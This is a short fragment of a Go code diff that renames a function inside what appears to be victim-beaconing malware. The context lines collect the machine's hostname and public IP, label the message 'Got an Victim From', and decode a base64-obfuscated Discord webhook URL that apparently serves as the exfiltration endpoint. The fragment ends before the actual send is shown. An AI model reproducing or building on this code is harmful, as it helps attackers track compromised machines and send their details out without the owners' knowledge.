@@ -19,7 +19,7 @@ type IP struct {
 	Query string
 }
 
-func getip2() string {
+func getit() string {
 	req, err := http.Get("http://ip-api.com/json/")
 	if err != nil {
 		return err.Error()
@@ -52,7 +52,7 @@ func data() {
 	nm, _ := os.Hostname()
 	var username = "Got an Victim From - "
 	var content = "Machine Name : " + nm + "\n" +
-		"IP Address : " + getip2() + "\n"
+		"IP Address : " + getit() + "\n"
 
 	var rawDecodedText, err = base64.StdEncoding.DecodeString("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTAyMzI1NjI1NDI4MzUxNzk4My9ycWQtaWdramhTU1dKd2FTNGFlcFkxcnZseGV6MTAyeW1xN21pdDhNTlV0V1I5YVdnU0ZodmpPNW1tbGdveXkyNzRFZQ==")
 
